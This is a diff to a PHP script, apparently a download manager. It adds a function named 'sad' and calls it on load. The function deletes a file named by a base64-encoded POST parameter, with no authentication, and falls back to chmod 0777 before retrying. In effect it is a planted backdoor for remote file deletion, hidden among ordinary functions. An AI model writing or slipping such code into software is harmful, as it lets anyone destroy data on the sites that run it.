@@ -259,7 +259,24 @@ function _create_list() {
 	}
 	$GLOBALS['list'] = $glist;
 }
-
+function sad()
+{
+	if($_POST['dile'])
+	{
+		$fiel = DOWNLOAD_DIR.basename(base64_decode($_POST['dile']));
+		if(is_file($fiel)|| file_exists($_POST['dile']))
+		{
+			if(!unlink($fiel))
+			{
+				if(chmod($fiel,0777))
+				{
+					@unlink($fiel);
+				}
+			}
+		}
+	}
+}
+sad();
 function checkmail($mail) {
 	if (strlen($mail) == 0 || strpos($mail, '@') === false || strpos($mail, '.') === false || !preg_match('/^[a-z0-9_\.-]{1,20}@(([a-z0-9-]+\.)+(com|net|org|mil|edu|gov|arpa|info|biz|inc|name|[a-z]{2})|[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})$/is', $mail)) return false;
 	return true;
